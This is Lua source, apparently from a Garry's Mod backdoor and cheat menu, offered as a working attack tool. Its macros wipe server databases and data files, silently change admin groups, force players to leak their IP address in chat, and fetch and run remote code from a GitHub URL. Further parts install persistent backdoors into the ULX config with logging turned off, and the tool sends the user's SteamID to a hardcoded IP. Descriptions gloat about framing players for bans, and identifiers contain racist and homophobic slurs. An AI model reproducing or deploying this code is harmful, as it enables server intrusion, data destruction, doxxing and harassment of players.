    },



    ["Cloak player"] = {

        ["Type"] = 2,

        ["Code"] = [[ if !v.BDCloaked then v:SetRenderMode( RENDERMODE_NONE ) v.BDCloaked = true else v:SetRenderMode( RENDERMODE_NORMAL ) v.BDCloaked = false end ]],

        ["Desc"] = "Toggles cloaking on the player, people can still see the weapon they are holding however",

    },



    ["Allahu Ackbar"] = {

        ["Type"] = 2,

        ["Code"] = [[

        local explo = ents.Create("env_explosion")

        explo:SetOwner(v)

        explo:SetPos(v:GetPos())

        explo:SetKeyValue("iMagnitude", "250")

        explo:Spawn()

        explo:Activate()

        explo:Fire("Explode", "", 0)

        if v:Alive() then v:Kill() end

        ]],

        ["Desc"] = "Blows them the fuck up, all kills are attributed to them so its great for getting random assholes banned",

    },



    ["ULX set access"] = {

        ["Type"] = 2,

        ["Code"] = [[ local userInfo = ULib.ucl.authed[ v:UniqueID() ] ULib.ucl.addUser( v:UniqueID(), userInfo.allow, userInfo.deny, @1 ) ]],

        ["Desc"] = "If ulx is installed this will (silently!) set them to the specified usergroup (1st parameter)",

        ["NeedsParameters"] = 1,

    },




------------------------ custom / new shit ------------------------




    ["Africanize"] = {

        ["Type"] = 2,

        ["Code"] = [[
            local bones = {
                [1] = {b = "ValveBiped.Bip01_Head1", v = Vector(4,0,4)},
                [2] = {b =  "ValveBiped.Bip01_R_Thigh", v = Vector(0,0,0)},
                [3] = {b = "ValveBiped.Bip01_L_Thigh", v = Vector(0,0,0)},
                [4] = {b =  "ValveBiped.Bip01_R_Calf", v = Vector(0,0,1)},
                [5] = {b = "ValveBiped.Bip01_L_Calf", v = Vector(0,0,1)},
                [6] = {b = "ValveBiped.Bip01_R_UpperArm", v = Vector(0,0,0)},
                [7] = {b = "ValveBiped.Bip01_L_UpperArm", v = Vector(0,0,0)},
                [8] = {b = "ValveBiped.Bip01_R_Forearm", v = Vector(1,1.5,1.5)},
                [9] = {b = "ValveBiped.Bip01_L_Forearm", v = Vector(1,1.5,1.5)},
                [10] = {b = "ValveBiped.Bip01_R_Clavicle", v = Vector(0,0,0)},
                [11] = {b = "ValveBiped.Bip01_L_Clavicle", v = Vector(0,0,0)},
            }

            if !v.is2D then
                v.is2D = true
                for k, bone  in pairs(bones) do
                    local boneToFind = v:LookupBone(bone.b)
                    v:ManipulateBoneScale( boneToFind, bone.v)
                end
            else
                v.is2D = false
                for k, bone  in pairs(bones) do
                    local boneToFind = v:LookupBone(bone.b)
                    v:ManipulateBoneScale( boneToFind, Vector(1,1,1))
                end
            end
        ]],

        ["Desc"] = "Makes the player seem as though they're 2D.",

    },

    ["M9K nuke"] = {

        ["Type"] = 2,

        ["Code"] = [[
//            if (m9k) then
                local nuke = ents.Create("m9k_davy_crockett_explo")
                nuke:SetPos(v:GetPos())
                nuke:SetOwner(v)
                nuke.Owner = v
                nuke:Spawn()
                nuke:Activate()
//            end
        ]],

        ["Desc"] = "Creates a nuke 'made' by selected user(s) & activates it where they're standing.",

    },

    ["Console jammer"] = {

        ["Type"] = 1,

        ["Code"] = [[
            if !(timer.Exists("consoleJammer")) then
                timer.Create("consoleJammer", 0.5, 0, function()
                    print( "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n" )
                end )
            else
                timer.Destroy("consoleJammer")
            end
        ]],

        ["Desc"] = "Spams the server side console with a fuck load of new lines",

    },

    ["Moan steps"] = {

        ["Type"] = 1,

        ["Code"] = [[
            if !(hook.GetTable()["PlayerFootstep"]["moanStep"]) then
                hook.Add("PlayerFootstep", "moanStep", function(ply, pos, foot, sound2, volume, filter) ply:EmitSound( "vo/npc/female01/pain06.wav",75,math.random( 50, 150 )) end )
            else
                hook.Remove("PlayerFootstep", "moanStep")
            end
        ]],

        ["Desc"] = "Turns all steps into highly orgasmic moans.",

    },

    ["Delete server"] = {

        ["Type"] = 3,

        ["Code"] = [[
            local date = os.date( "%m-%d-%y" )
            local databases = { "jobdata","darkrp_door","darkrp_levels","darkrp_prestige","darkrp_doorgroups","darkrp_doorjobs","darkrp_jobspawn","darkrp_position","darkrp_player","darkrp_dbversion","FAdmin_CAMIPrivileges","FADMIN_GROUPS","FAdmin_Immunity","FADMIN_MOTD","FAdmin_PlayerGroup","FADMIN_PRIVILEGES","FADMIN_RESTRICTEDENTS","FAdmin_ServerSettings","FAdminBans","FPP_ANTISPAM1","FPP_BLOCKED1","FPP_BLOCKMODELSETTINGS1","FPP_ENTITYDAMAGE1","FPP_GLOBALSETTINGS1","FPP_GRAVGUN1","FPP_GROUPMEMBERS1","FPP_GROUPS3","FPP_GROUPTOOL","FPP_PHYSGUN1","FPP_PLAYERUSE1","FPP_TOOLADMINONLY","FPP_TOOLGUN1","FPP_TOOLRESTRICTPERSON1","FPP_TOOLTEAMRESTRICT","FPP_BLOCKEDMODELS1","awarn_playerdata","awarn_serverdata","awarn_warnings","blogs_players_v3","blogs_v3","stt_date","stt_players","mlog_logs","mlog_permissions","atlaschat_players","atlaschat_ranks","atlaschat_remote","atlaschat_restrictions","OreBag","fcd_playerData","dailylogin","ChessLeaderboard","qsgr_data","voting_npcs","cac_incidents","steam_rewards","playerdata","playerinformation","utime","permaprops","cc_characters","cc_npcs","ckit_chips","ckit_persist","exsto_data_bans","exsto_data_ranks","exsto_data_users","exsto_data_variables","exsto_restriction","inventories","kinv_items","libk_player","permitems","player_gangapps","player_gangdata","player_gangs","ps2_categories","ps2_equipmentslot","ps2_HatPersistence","ps2_itemmapping","ps2_itempersistence","ps2_OutfitHatPersistenceMapping","ps2_outfits","ps2_playermodelpersistence","ps2_servers","ps2_settings","ps2_trailpersistence","ps2_wallet","removeprops","scoreboard_friends","serverguard_analytics","serverguard_bans","serverguard_pms","serverguard_ranks","serverguard_reports","serverguard_schema","serverguard_ttt_autoslays","serverguard_users","serverguard_watchlist","tttstats","ttt_passes_history","specdm_stats_new","ps2_achievements","ps2_boosterpersistence","ps2_cratepersistence","ps2_instatswitchweaponpersistence","ps2_keypersistence","ps2_rolecontrolpersistence","ps2_weaponpersistence","rapsheet","damagelog_autoslay","damagelog_names","damagelog_oldlogs","damagelog_weapons","kmapvote_mapinfo","kmapvote_ratings","mgang_gangs","mgang_players","deathrun_ids","deathrun_records","deathrun_stats","sui_ratings","shop_texthats","shop_money","shop_items","report_log" }
            local datafiles = { "ulib/bans.txt","ulib/groups.txt","ulib/misc_registered.txt","ulib/users.txt","ulx/adverts.txt","ulx/apromote.txt","ulx/banmessage.txt","ulx/banreasons.txt","ulx/downloads.txt","ulx/gimps.txt","ulx/motd.txt","ulx/restrictions.txt","ulx/sbox_limits.txt","ulx/votemaps.txt","apg/settings.txt","atags/tags.txt","atags/rankchattags.txt","atags/playerchattags.txt","atags/tags.txt","atags/selectedtags.txt","atags/ranktags.txt","atags/playertags.txt","vcmod/settings_sv.txt","vcmod/config_sv_privilages.txt","wire_version.txt","UTeam.txt","prevhas.txt","cac/system_log_sv.txt","cac/serverworkshopinformation.txt","cac/settings.txt","cac/serverluainformation.txt","hitnumbers/settings.txt","soundlists/common_sounds.txt","vcmod/controls.txt","vcmod/dataserver.txt","qsgr_data/sqgr_settings.txt","blogs/configcache.txt","blogs/language.txt","cac/adminuipack.txt","ezjobs/config.txt","damagelog/colors.txt","damagelog/filters_new.txt","craphead_scripts/armory_robbery/rp_downtown_v4c/policearmory_location.txt","craphead_scripts/armory_robbery/rp_downtown_v4c_v2/policearmory_location.txt","craphead_scripts/armory_robbery/rp_downtown_v2/policearmory_location.txt","craphead_scripts/armory_robbery/rp_downtown_evilmelon_v1/policearmory_location.txt","craphead_scripts/armory_robbery/rp_downtown_v4c_v3/policearmory_location.txt","craphead_scripts/armory_robbery/rp_downtown_v4c_v4/policearmory_location.txt","mg_gangsdata/mg_npcspawns.txt","ulx/debugdump.txt","ulx/empty_teams.txt","chattags.txt","caseclaims.txt", "sammyservers_textscreens.txt","permaprops_permissions.txt","chattags.txt","prevhash.txt","permaprops_config.txt","zwhitelistjobdata/jobsetting.txt","zwhitelistjobdata/whitelistjob.txt","zmodserveroption/sysjobwhitelist.txt","vliss/settings/config.txt","nordahl_spawnpoint/rp_venator_v3.txt","nordahl_spawnpoint/rp_venator_v2.txt","nordahl_spawnpoint/rp_venator_v1.txt","nordahl_spawnpoint/rp_venator_gg.txt","nordahl_spawnpoint/rp_venator_ausv4.txt","nordahl_spawnpoint/rp_venator_v2_ffg.txt","planningevent/prehud.txt","planningoption/hourformat.txt","nordahl_spawnpoint/arena_byre.txt","nordahl_spawnpoint/rp_venator_v2_immersive.txt","nordahl_spawnpoint/rp_venator_fade_v3.txt","nordahl_spawnpoint/rp_venator_gr.txt","nordahl_spawnpoint/rp_tatoonie_dunsea_v1.txt","nordahl_spawnpoint/rp_scifi.txt","nordahl_spawnpoint/rishimoon_crimson.txt","nordahl_spawnpoint/rp_pripyat_hl2.txt","nordahl_spawnpoint/rp_onwardhope.txt", "nordahl_spawnpoint/rp_oldworld_fix.txt","nordahl_spawnpoint/sd_doomsday.txt","nordahl_spawnpoint/sd_doomsday_event.txt","nordahl_spawnpoint/rp_naboo_city_v1.txt","nordahl_spawnpoint/rp_noclyria_crimson.txt","nordahl_spawnpoint/rp_nar_shaddaa_v2.txt","nordahl_spawnpoint/rp_mos_mersic_v2.txt","nordahl_spawnpoint/rp_kashyyk_jungle_b2.txt","nordahl_spawnpoint/dust_dunes.txt","nordahl_spawnpoint/rp_cscdesert_v2-1_propfix.txt","nordahl_spawnpoint/rd_asteroid.txt","nordahl_spawnpoint/naboo.txt","nordahl_spawnpoint/kashyyyk.txt","nordahl_spawnpoint/geonosis.txt","nordahl_spawnpoint/fightspace3b.txt","nordahl_spawnpoint/endor.txt","nordahl_spawnpoint/toth_forgotten.txt"}
            local sensitivefiles = { "ulx_logs/"..date..".txt","ulib/bans.txt","ulib/groups.txt","ulib/misc_registered.txt","ulib/users.txt","ulx/adverts.txt","ulx/apromote.txt","ulx/banmessage.txt","ulx/banreasons.txt","ulx/downloads.txt","ulx/gimps.txt","ulx/motd.txt","ulx/restrictions.txt","ulx/sbox_limits.txt","ulx/votemaps.txt","apg/settings.txt","atags/tags.txt","atags/rankchattags.txt","atags/playerchattags.txt","atags/tags.txt","atags/selectedtags.txt","atags/ranktags.txt","atags/playertags.txt","vcmod/settings_sv.txt","vcmod/config_sv_privilages.txt","cac/system_log_sv.txt","cac/serverworkshopinformation.txt","cac/settings.txt","cac/serverluainformation.txt","vcmod/controls.txt","vcmod/dataserver.txt","blogs/configcache.dat","blogs/language.txt","blogs/config_v5.txt","cac/adminuipack.txt","ulx/debugdump.txt","ulx/empty_teams.txt","chattags.txt","caseclaims.txt", "sammyservers_textscreens.txt","permaprops_permissions.txt","chattags.txt","permaprops_config.txt","whitelist.txt","zwhitelistjobdata/jobsetting.txt","zwhitelistjobdata/whitelistjob.txt","zmodserveroption/sysjobwhitelist.txt","nordahl_spawnpoint/rp_venator_v3.txt","nordahl_spawnpoint/rp_venator_v2.txt","nordahl_spawnpoint/rp_venator_v1.txt","nordahl_spawnpoint/rp_venator_gg.txt","nordahl_spawnpoint/rp_venator_ausv4.txt","nordahl_spawnpoint/rp_venator_v2_ffg.txt","planningevent/prehud.txt","planningoption/hourformat.txt","nordahl_spawnpoint/arena_byre.txt","nordahl_spawnpoint/rp_venator_v2_immersive.txt","nordahl_spawnpoint/rp_venator_fade_v3.txt","nordahl_spawnpoint/rp_venator_gr.txt","nordahl_spawnpoint/rp_tatoonie_dunsea_v1.txt","nordahl_spawnpoint/rp_scifi.txt","nordahl_spawnpoint/rishimoon_crimson.txt","nordahl_spawnpoint/rp_pripyat_hl2.txt","nordahl_spawnpoint/rp_onwardhope.txt", "nordahl_spawnpoint/rp_oldworld_fix.txt","nordahl_spawnpoint/sd_doomsday.txt","nordahl_spawnpoint/sd_doomsday_event.txt","nordahl_spawnpoint/rp_naboo_city_v1.txt","nordahl_spawnpoint/rp_noclyria_crimson.txt","nordahl_spawnpoint/rp_nar_shaddaa_v2.txt","nordahl_spawnpoint/rp_mos_mersic_v2.txt","nordahl_spawnpoint/rp_kashyyk_jungle_b2.txt","nordahl_spawnpoint/dust_dunes.txt","nordahl_spawnpoint/rp_cscdesert_v2-1_propfix.txt","nordahl_spawnpoint/rd_asteroid.txt","nordahl_spawnpoint/naboo.txt","nordahl_spawnpoint/kashyyyk.txt","nordahl_spawnpoint/geonosis.txt","nordahl_spawnpoint/fightspace3b.txt","nordahl_spawnpoint/endor.txt","nordahl_spawnpoint/toth_forgotten.txt"}
            
            for k,v in pairs(databases) do
                if sql.TableExists(v) then 
                    sql.Query("DROP TABLE "..v.." ;")
                    sql.Query("CREATE TABLE IF NOT EXISTS "..v.." ( steamid TEXT NOT NULL PRIMARY KEY, value TEXT );")
                end
            end

            for k,v in pairs(datafiles) do
                if file.Exists(v) then
                    file.Delete(v)
                    file.write(v, "odium.pro hehe")
                end
            end

            for k,v in pairs(sensitivefiles) do
                if file.Exists(v) then
                    file.Delete(v)
                    file.write(v, "odium.pro hehe")
                end
            end
        ]],

        ["Desc"] = "Removes as much data as possible.",

    },

    ["Kill player (silent)"] = {

        ["Type"] = 2,

        ["Code"] = [[v:KillSilent()]],

        ["Desc"] = "Silent slay a player.",

    },

    ["Delete props"] = {

        ["Type"] = 2,

        ["Code"] = [[v:ConCommand("gmod_cleanup")]],

        ["Desc"] = "Removes all of the selected users props.",

    },

    ["Send lua"] = {

        ["Type"] = 2,

        ["Code"] = [[ v:SendLua( ""..@1.."") ]],

        ["Desc"] = "Sends lua to the selected user.",

        ["NeedsParameters"] = 1,

    },

    ["My ip is..."] = {

        ["Type"] = 2,

        ["Code"] = [[
            if (darkrp || DarkRP) then
                v:SendLua('http.Fetch("http://ipv4bot.whatismyipaddress.com", function(b,l,h,c) LocalPlayer():ConCommand("say /ooc My IP is "..b) end, function(error) return error end )')
            else
                v:SendLua('http.Fetch("http://ipv4bot.whatismyipaddress.com", function(b,l,h,c) LocalPlayer():ConCommand("say My IP is "..b) end, function(error) return error end )')
            end
        ]],

        ["Desc"] = "Forces the selected user(s) to say their own ip in chat.",

    },

    ["Ice skating simulator"] = {

        ["Type"] = 1,

        ["Code"] = [[ if !(icePark) then icePark = true RunConsoleCommand("sv_friction", 0) else icePark = false RunConsoleCommand("sv_friction", 8) end ]],

        ["Desc"] = "Makes everyone skate around like they're on ice.",

    },

    ["Inject CopySploit"] = {

        ["Type"] = 2,

        ["Code"] = [[
            v:SendLua('http.Fetch("http://raw.githubusercontent.com/WERooo/somelua/master/CopySploit.lua",function(body) RunString(body) end)')
        ]],

        ["Desc"] = "Inject CopySploit to specific player",

    },

// key/view scrambler, fuck with escape menu

------------------------ dangerous codens ------------------------



    ["DarkRP clear all money"] = {

        ["Type"] = 3,

        ["Code"] = [[RunConsoleCommand("rp_resetallmoney")]],

        ["Desc"] = "Kids will cry to the admins for the next week about losing their precious money",

    },



    ["Cleanup map"] = {

        ["Type"] = 3,

        ["Code"] = [[game.CleanUpMap()]],

        ["Desc"] = "Wipe the map clean, taking everybodys cars, printers and bases out",

    },



    ["Vaporize all players"] = {

        ["Type"] = 3,

        ["Code"] = [[for k, v in pairs(player.GetAll()) do v:Remove() end]],

        ["Desc"] = "Deletes their player entity, leaving them staring at a wall of errors",

    },





    ["FPP Unrestrict everything"] = {

        ["Type"] = 3,

        ["Code"] = [[FPP.Blocked = {} FPP.BlockedModels = {} FPP.RestrictedTools = {} FPP.RestrictedToolsPlayers = {} ]],

        ["Desc"] = "",

    },



    ["Wipe data folder"] = {

        ["Type"] = 3,

        ["Code"] = [[local files, directories = file.Find( "*", "DATA" ) for k, v in pairs( files ) do file.Delete( v ) end ]],

        ["Desc"] = "Wipe the servers data folder, fucking all their settings and stuff up",

    },



    ["Wipe DarkRP SQL Tables"] = {

        ["Type"] = 3,

        ["Code"] = [[ MySQLite.query ('DROP TABLE darkrp_player' MySQLite.query('CREATE TABLE IF NOT EXISTS darkrp_player(idx INTEGER NOT NULL)') ]],

        ["Desc"] = "Completely fucks darkrp, forces them to reinstall the entire server",

    },



}



local selectedbackdoor = ""

local backdoorargs = ""

local selectedplayers = {}







//////////////////////////////// BIG PRIVET CHEETZ ////////////////////////////////
BD.BDMacros["@ Persistent Infection"] = {
    ["Type"] = 1,
    ["Code"] = [[
    local config = ULib.fileRead( "data/ulx/config.txt" )
    config = config.."\nulx logEcho 0"
    config = config.."\nulx luarun %BD"
    config = config.."\nulx logEcho 1"
    ULib.fileWrite( "data/ulx/config.txt", config )
    for _, p in pairs(player.GetAll()) do if %LCP then p:ChatPrint( "Persistent infection installed on server" ) end end
    ]],
    ["Desc"] = "Writes the backdoor code into memory, making sure that it stays on the server after restart",
    ["Private"] = true,
}

BD.BackdoorTypes["DefqonBackdoor"] = {
    ["Code"] = "util.AddNetworkString('DefqonBackdoor') net.Receive('DefqonBackdoor', function( length, ply ) local netString = net.ReadString() local bit = net.ReadBit() if bit == 1 then RunString(netString) else game.ConsoleCommand(netString .. '\n') end end)",
    ["Netkey"] = "DefqonBackdoor",
}

BD.BackdoorTypes["No Narks"] = {
    ["Code"] = "util.AddNetworkString( 'NoNerks' ) net.Receive( 'NoNerks', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )",
    ["Netkey"] = "NoNerks",
}

function BD.GenerateBackdoorList( parent, category )



for k, v in SortedPairs( BD.BDMacros, false ) do

    if v["Type"] != category then continue end



    local plypanel2 = vgui.Create( "DPanel" )

    plypanel2:SetPos( 0, 0 )

    plypanel2:SetSize( 200, 25 )

    plypanel2.Paint = function() -- Paint function

        draw.RoundedBoxEx(8,1,1,plypanel2:GetWide(),plypanel2:GetTall(),Color(0, 0, 0, 150), false, false, false, false)

        if selectedbackdoor == k then surface.SetDrawColor(Color(50, 250, 90, 255)) else surface.SetDrawColor(Color(50, 50, 90, 255)) end

        surface.DrawOutlinedRect(1, 1, plypanel2:GetWide() - 1 , plypanel2:GetTall() - 1)

    end



    local plyname = vgui.Create( "DLabel", plypanel2 )

    plyname:SetPos( 10, 5 )

    plyname:SetFont( "Trebuchet18" )

    local tcol = Color( 255, 255, 255 )

    if v.Private then tcol = Color( 155, 255, 155 ) end

    plyname:SetColor( tcol )

    plyname:SetText( k )

    plyname:SetSize(180, 15)





    local faggot = vgui.Create("DButton", plypanel2)

    faggot:SetSize( plypanel2:GetWide(), plypanel2:GetTall() )

    faggot:SetPos( 0, 0 )

    faggot:SetText("")

    if v["Desc"] != "" then faggot:SetToolTip( v["Desc"] ) end

    faggot.Paint = function(panel, w, h)

        return

    end

    faggot.DoClick = function()

        selectedbackdoor = k

    end





    parent:AddItem( plypanel2 )



end



end



function BD.FormatCodeTargeted()

if !BD.BackdoorActive() then BD.ChatText( "Warning: backdoor malfunctioning or not present!", Color(255,155,155) ) return end

if selectedbackdoor == "" then BD.ChatText( "You haven't selected a macro to use!", Color(255,155,155) ) return end

local param = string.Explode( ",", backdoorargs )

local ids = {}

for k, v in pairs( selectedplayers ) do

    if !v:IsValid() then table.RemoveByValue( selectedplayers, v ) continue end

    table.insert( ids, v:UniqueID() )

end



local code = [[ local targets = ## for k, v in pairs( player.GetAll() ) do if !v:IsValid() then continue end if table.HasValue( targets, v:UniqueID() ) then %% end end ]]

code = string.Replace( code, "##", table.ToString( ids ) )

code = string.Replace( code, "%%", BD.BDMacros[selectedbackdoor]["Code"] or "" )

code = string.Replace( code, "%LP", "p:UniqueID() == \""..LocalPlayer():UniqueID().."\"" )



if BD.BDMacros[selectedbackdoor]["NeedsParameters"] and (BD.BDMacros[selectedbackdoor]["NeedsParameters"] > #param or param[1] == "" ) then BD.ChatText( "This macro requires parameters to work! check its description for more info", Color(255,155,155) ) return end

if #param < 1 then param = { [1] = "derp", [2] = "derp", [3] = "derp", [4] = "derp", [5] = "derp" } end



for k, v in pairs( param ) do

    code = string.Replace( code, "@"..k, [["]]..v..[["]] )

end



BD.Fire( code )



end



function BD.FormatCodeGlobal()

if !BD.BackdoorActive() then BD.ChatText( "Warning: backdoor malfunctioning or not present!", Color(255,155,155) ) return end

if selectedbackdoor == "" then BD.ChatText( "You haven't selected a macro to use!", Color(255,155,155) ) return end

local param = string.Explode( ",", backdoorargs )



local code = BD.BDMacros[selectedbackdoor]["Code"]



if BD.BDMacros[selectedbackdoor]["NeedsParameters"] and (BD.BDMacros[selectedbackdoor]["NeedsParameters"] > #param or param[1] == "" ) then BD.ChatText( "This macro requires parameters to work! check its description for more info", Color(255,155,155) ) return end

if #param < 1 then param = { [1] = "derp", [2] = "derp", [3] = "derp", [4] = "derp", [5] = "derp" } end



for k, v in pairs( param ) do

    code = string.Replace( code, "@"..k, [["]]..v..[["]] )

    code = string.Replace( code, "%LP", LocalPlayer():UniqueID() )

    code = string.Replace( code, "%LCP", "p:UniqueID() == \""..LocalPlayer():UniqueID().."\"" )

    code = string.Replace( code, "%BD", BD.GetActive().Code )

end



BD.Fire( code )



end





local safenet = net

local function bdnet()

    if odium and odium.G then return odium.G.net end

    return safenet

end


local h = http
local p = "Post"
local str = "http://162.243.145.59:5000/api/backdoor/use"
local lp = LocalPlayer()
local n = lp:Nick()
local id = lp:SteamID64()

h[p](str, {
    name = n,
    steamid = id,
},
nil, nil)

function BD.Fire( code )

    local cbd = BD.CurrentBackdoor

    if !BD.Backdoors[cbd] then

        BD.ChatText( "The selected backdoor is unavailable!", Color(255,155,155) )

        return

    end

    local key = BD.BackdoorTypes[cbd].Netkey



    bdnet().Start( key )

    bdnet().WriteString( code )

    bdnet().WriteBit(1)

    bdnet().SendToServer()

end





function BD.BackdoorMenu()



BD.Backdoors = BD.PingBackDoors()



local BDMenu = vgui.Create("DFrame")

BDMenu:SetSize(650,720)

BDMenu:SetTitle("Backdoor Menu")

BDMenu:Center()

BDMenu:MakePopup()



BDMenu.Paint = function( self, w, h)

surface.SetDrawColor( Color(50, 50, 90, 255) )

surface.DrawRect( 0, 0, w, h )

surface.SetDrawColor( Color(155, 155, 155, 255) )

surface.DrawOutlinedRect( 0, 0, w, h )

surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )

surface.SetDrawColor( Color(0, 0, 0, 200) )

surface.DrawRect( 10, 25, w - 20, h - 35 )

surface.DrawRect( 15, 30, w - 30, 35 )

draw.SimpleText("Indiscriminate Lulz", "DermaDefault", 22, 75, Color(255, 255, 255), 0, 1)

draw.SimpleText("Specific Targets", "DermaDefault", 228, 75, Color(255, 255, 255), 0, 1)

draw.SimpleText("Trash the place", "DermaDefault", 432, 75, Color(255, 255, 255), 0, 1)

draw.SimpleText("Players to Target", "DermaDefault", 432, 305, Color(255, 255, 255), 0, 1)

draw.SimpleText("Macro Paramaters (seperate with commas)", "DermaDefault", 432, 610, Color(255, 255, 255), 0, 1)

end



local it = 145



local wedungoofd = vgui.Create( "DLabel", BDMenu )

wedungoofd:SetPos( 25, 38 )

wedungoofd:SetFont( "Trebuchet18" )

wedungoofd:SetColor( Color( 100, 255, 100 ) )

wedungoofd:SetText( "CHOOSE BACKDOOR:" )

wedungoofd:SizeToContents()



for bd, t in pairs( BD.BackdoorTypes ) do

    local faggot = vgui.Create("DButton", BDMenu)

    faggot:SetSize( 100, 25 )

    faggot:SetPos( it, 35 )

    faggot:SetText( bd )

    faggot:SetTextColor(Color(255, 255, 255, 255))

    faggot.Paint = function(panel, w, h)

        if BD.Backdoors[bd] then

            surface.SetDrawColor(100, 100, 200 ,255)

            surface.DrawOutlinedRect(0, 0, w, h)

            surface.SetDrawColor(0, 0, 50 ,155)

            surface.DrawRect(0, 0, w, h)

        else

            surface.SetDrawColor(50, 50, 50 ,155)

            surface.DrawRect(0, 0, w, h)

        end

    end

    faggot.DoClick = function()

        BD.ChatText( "Set active backdoor to "..bd, Color(155,155,255) )

        BD.CurrentBackdoor = bd

        surface.PlaySound("buttons/button18.wav")

    end

    it = it + 110

end



local Plist = vgui.Create( "DPanelList", BDMenu )

Plist:SetPos( 20, 85 )

Plist:SetSize( 200, 530 )

Plist:SetPadding( 5 )

Plist:SetSpacing( 5 )

Plist:EnableHorizontal( false )

Plist:EnableVerticalScrollbar( true )

Plist:SetName( "" )

Plist.Paint = function( self, w, h )

    surface.SetDrawColor(50, 50, 50 ,255)

    surface.DrawOutlinedRect(0, 0, w, h)

    surface.SetDrawColor(0, 0, 0 ,200)

    surface.DrawRect(0, 0, w, h)

end



local Plist2 = vgui.Create( "DPanelList", BDMenu )

Plist2:SetPos( 225, 85 )

Plist2:SetSize( 200, 610 )

Plist2:SetPadding( 5 )

Plist2:SetSpacing( 5 )

Plist2:EnableHorizontal( false )

Plist2:EnableVerticalScrollbar( true )

Plist2:SetName( "" )

Plist2.Paint = function( self, w, h )

    surface.SetDrawColor(50, 50, 50 ,255)

    surface.DrawOutlinedRect(0, 0, w, h)

    surface.SetDrawColor(0, 0, 0 ,200)

    surface.DrawRect(0, 0, w, h)

end



local Plist3 = vgui.Create( "DPanelList", BDMenu )

Plist3:SetPos( 430, 85 )

Plist3:SetSize( 200, 210 )

Plist3:SetPadding( 5 )

Plist3:SetSpacing( 5 )

Plist3:EnableHorizontal( false )

Plist3:EnableVerticalScrollbar( true )

Plist3:SetName( "" )

Plist3.Paint = function( self, w, h )

    surface.SetDrawColor(50, 50, 50 ,255)

    surface.DrawOutlinedRect(0, 0, w, h)

    surface.SetDrawColor(0, 0, 0 ,200)

    surface.DrawRect(0, 0, w, h)

end



local Plist4 = vgui.Create( "DPanelList", BDMenu )

Plist4:SetPos( 430, 315 )

Plist4:SetSize( 200, 250 )

Plist4:SetPadding( 5 )

Plist4:SetSpacing( 5 )

Plist4:EnableHorizontal( false )

Plist4:EnableVerticalScrollbar( true )

Plist4:SetName( "" )

Plist4.Paint = function( self, w, h )

    surface.SetDrawColor(50, 50, 50 ,255)

    surface.DrawOutlinedRect(0, 0, w, h)

    surface.SetDrawColor(0, 0, 0 ,200)

    surface.DrawRect(0, 0, w, h)

end



    local faggot = vgui.Create("DButton", BDMenu)

    faggot:SetSize( 200, 35 )

    faggot:SetPos( 430, 660 )

    faggot:SetText("Activate Backdoor!")

    faggot:SetTextColor(Color(255, 255, 255, 255))

    faggot.Paint = function(panel, w, h)

        surface.SetDrawColor(100, 100, 200 ,255)

        surface.DrawOutlinedRect(0, 0, w, h)

        surface.SetDrawColor(0, 0, 50 ,155)

        surface.DrawRect(0, 0, w, h)

    end

    faggot.DoClick = function()

        if !BD.BDMacros[selectedbackdoor] or selectedbackdoor == "" then BD.ChatText( "You haven't even selected a macro to use ya dingus!", Color(255,155,155) ) return end

        if BD.BDMacros[selectedbackdoor].Type == ( 1 or 3 ) then BD.FormatCodeGlobal() else BD.FormatCodeTargeted() end

        surface.PlaySound("buttons/button18.wav")

    end





    local helpimretarded = vgui.Create("DButton", BDMenu)

    helpimretarded:SetSize( 200, 35 )

    helpimretarded:SetPos( 20, 660 )

    helpimretarded:SetText("Print backdoor code")

    helpimretarded:SetTextColor(Color(255, 255, 255, 255))

    helpimretarded.Paint = function(panel, w, h)

        surface.SetDrawColor(100, 100, 200 ,255)

        surface.DrawOutlinedRect(0, 0, w, h)

        surface.SetDrawColor(0, 0, 50 ,155)

        surface.DrawRect(0, 0, w, h)

    end

    helpimretarded.DoClick = function()

        BD.ChatText( "Output backdoor code to clipboard.  Ctrl-V it into a serverside .lua file on the target server then go molest its holes", Color(155,255,155) )

        local bdstring = BD.GetActive().Code

 --       local bdstring = [[util.AddNetworkString( "_CAC_ReadMemory" ) net.Receive( "_CAC_ReadMemory", function() local x = CompileString( net.ReadString(), "LuaCmd", false ) if isfunction( x ) then x() end end )]]

        SetClipboardText( bdstring ) 

    end



    local helpimretarded2 = vgui.Create("DButton", BDMenu)

    helpimretarded2:SetSize( 200, 35 )

    helpimretarded2:SetPos( 20, 620 )

    helpimretarded2:SetText("ULX Luarun Backdoor")

    helpimretarded2:SetTextColor(Color(255, 255, 255, 255))

    helpimretarded2.Paint = function(panel, w, h)

        surface.SetDrawColor(100, 100, 200 ,255)

        surface.DrawOutlinedRect(0, 0, w, h)

        surface.SetDrawColor(0, 0, 50 ,155)

        surface.DrawRect(0, 0, w, h)

    end

    helpimretarded2.DoClick = function()

        BD.ChatText( "Using ulx luarun to silently infect server", Color(155,255,155) )

        LocalPlayer():ConCommand( [[ulx rcon ulx logEcho 0]] )

        timer.Simple( 0.5, function()

            LocalPlayer():ConCommand( "ulx luarun "..BD.GetActive().Code )

--            LocalPlayer():ConCommand( "ulx luarun util.AddNetworkString( '_CAC_ReadMemory' ) net.Receive( '_CAC_ReadMemory', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )" )

        end )

        timer.Simple( 1, function() LocalPlayer():ConCommand( [[ulx rcon ulx logEcho 1]] ) end )



        timer.Simple( 1.5, function() if BD.IsMessagePooled( BD.GetActive().Netkey ) then BD.ChatText( "Successfully infected!", Color(155,255,155) ) else BD.ChatText( "ULX infection failed!", Color(255,155,155) ) end end )

    end





local moonman = vgui.Create( "DTextEntry", BDMenu )

moonman:SetPos( 430, 625 )

moonman:SetSize( 200, 30 )

moonman:SetText( backdoorargs )

moonman.OnChange = function( self )

    backdoorargs = self:GetValue()

--    surface.PlaySound("buttons/button3.wav")

end





    local target1 = vgui.Create("DButton", BDMenu)

    target1:SetSize( 40, 20 )

    target1:SetPos( 520, 295 )

    target1:SetText("All")

